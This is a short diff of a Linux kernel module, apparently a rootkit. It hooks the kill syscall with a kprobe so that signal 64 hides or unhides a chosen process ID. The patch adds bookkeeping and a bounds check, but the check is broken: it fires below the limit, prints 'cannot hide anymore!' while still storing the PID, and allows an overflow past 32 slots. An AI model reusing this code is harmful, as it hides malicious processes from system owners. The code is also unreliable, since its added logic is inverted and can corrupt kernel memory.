@@ -178,17 +178,24 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
   if (sig == 64) {
     // hide processes
     int i;
+    if (kill_this_pid == 0) {
+      return 0;
+    }
     for (i = 0; i < 32; i++) {
       if (HIDE_ME[i] == kill_this_pid) {
         printk(KERN_INFO "unhiding: %d\n", kill_this_pid);
         HIDE_ME[i] = 0;
+        HIDE_ME_COUNT--;
         regs->ax = 0;
         regs->ip = get_syscall_return_addr(regs);
         return 1;
       }
     }
     printk(KERN_INFO "hiding: %d\n", kill_this_pid);
-    HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
+    if (HIDE_ME_COUNT < 33) {
+      printk(KERN_INFO "cannot hide anymore!\n");
+      HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
+    }
     regs->ax = 0;
     regs->ip = get_syscall_return_addr(regs);
     return 1;
